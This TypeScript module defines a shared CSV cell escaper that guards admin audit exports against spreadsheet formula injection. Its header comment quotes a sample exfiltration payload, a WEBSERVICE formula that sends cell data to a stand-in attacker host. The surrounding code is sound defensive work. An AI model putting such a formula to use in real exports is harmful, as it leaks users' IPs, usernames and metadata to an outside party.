/**
 * R128 (B3-F2) — the ONE shared CSV cell escaper for admin exports.
 *
 * Two copies existed (security.tsx's inline `escapeCsvField` + users.tsx's
 * exported `csvCell`) and BOTH guarded quotes only. B3-F2's red-team
 * finding: the security audit/auth CSV exports embed admin-controlled and
 * user-controlled strings (`actorUsername`, telegram-webhook `metadata`,
 * auth `identifier` — phone identifiers legitimately start with `+`), and
 * a cell starting with `=`, `+`, `-`, `@`, tab or CR is a spreadsheet
 * FORMULA trigger — `=WEBSERVICE("https://attacker/…"&A2)` or
 * `=HYPERLINK(...)` executes on open in Excel/Sheets, exfiltrating the
 * audit window (IPs, usernames, metadata) during exactly the incident
 * review the export exists for.
 *
 * Mitigation = the OWASP CSV-injection idiom: quote the cell (RFC-4180,
 * embedded quotes doubled — the A2-3 behavior users-csv-export.test.tsx
 * pins) AND prefix a neutral apostrophe on the formula-trigger leading
 * characters. Excel/Sheets treat a leading `'` as a text-affordance
 * marker: it does not display in the cell and the payload renders as
 * inert text. Phones like `+218…` keep displaying `+218…`.
 */

/** Leading characters that turn a CSV cell into a formula in Excel,
 * Google Sheets, or LibreOffice (OWASP CSV Injection cheat sheet). */
const FORMULA_TRIGGERS = new Set(["=", "+", "-", "@", "\t", "\r"]);

/**
 * Quote a value as an RFC-4180 CSV cell with the formula-injection guard.
 * `null`/`undefined` render as an empty cell (security.tsx's `?? ""`
 * behavior); numbers never trigger the guard (`String(150)` has no
 * leading trigger character).
 */
export function csvCell(value: unknown): string {
  let text = String(value ?? "");
  if (text.length > 0 && FORMULA_TRIGGERS.has(text[0]!)) {
    text = `'${text}`;
  }
  return `"${text.replace(/"/g, '""')}"`;
}
